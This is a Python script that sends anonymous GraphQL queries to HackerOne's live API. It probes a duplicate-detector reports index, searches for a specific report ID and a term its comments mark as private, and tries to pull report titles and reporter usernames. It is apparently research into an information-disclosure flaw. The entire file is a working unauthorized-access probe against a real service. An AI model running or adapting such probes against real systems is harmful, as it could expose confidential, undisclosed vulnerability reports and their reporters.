# -*- coding: utf-8 -*-
"""CF4 组:DuplicateDetectorReportsIndex 匿名探测(2026-09-08)"""
import json
import urllib.request

BASE = "https://hackerone.com/graphql"
HDRS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/json"}


def post(query, label):
    data = json.dumps({"query": query}).encode()
    req = urllib.request.Request(BASE, data=data, headers=HDRS)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            body = r.read().decode("utf-8", "replace")
        print(f"===== {label}\n{body[:2000]}\n")
    except urllib.error.HTTPError as e:
        print(f"===== {label} HTTP {e.code}\n{e.read().decode('utf-8', 'replace')[:800]}\n")
    except Exception as e:
        print(f"===== {label} ERR {e}\n")


# 1. 全量计数(对比其它 index)
post('{ search(index: DuplicateDetectorReportsIndex, query_string: "*:*", first: 1){ total_count } }', "CF4a_dd_total")
# 2. 搜 target 报告 id 特征(私有!)
post('{ search(index: DuplicateDetectorReportsIndex, query_string: "pg_repack", first: 1){ total_count } }', "CF4b_dd_pgrepack")
post('{ search(index: DuplicateDetectorReportsIndex, query_string: "3732660", first: 1){ total_count } }', "CF4c_dd_3732660")
# 3. 字段结构(和 HacktivityDocument 同?)
post('{ __type(name:"HacktivityDocument"){ fields{ name } } }', "CF4d_doc_fields_all")
# 4. 文档投影:看第一条的完整字段(如果 report 对象可投影→私有内容?)
post('{ search(index: DuplicateDetectorReportsIndex, query_string: "*:*", first: 1){ total_count edges{ node{ ... on HacktivityDocument{ _id id public report{ id title } reporter{ username } } } } } }', "CF4e_dd_first")
